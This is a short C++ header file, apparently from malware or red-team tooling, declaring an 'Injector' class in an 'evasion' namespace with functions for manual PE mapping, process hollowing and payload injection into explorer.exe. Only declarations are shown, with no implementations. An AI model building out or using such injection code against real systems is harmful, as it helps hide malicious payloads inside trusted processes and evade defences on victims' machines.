#pragma once
#include <windows.h>
#include <vector>
#include <cstdint>
#include <string>

namespace evasion {

class Injector {
public:
    // Manual Mapping / PE Injection
    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload);

    // Process Hollowing (uses MapAndInject)
    static bool HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload);

    // Get Process ID by name
    static DWORD GetProcessIdByName(const std::wstring& processName);

    // Robust injection into explorer.exe
    static bool InjectIntoExplorer(const std::vector<uint8_t>& payload);
};

} // namespace evasion
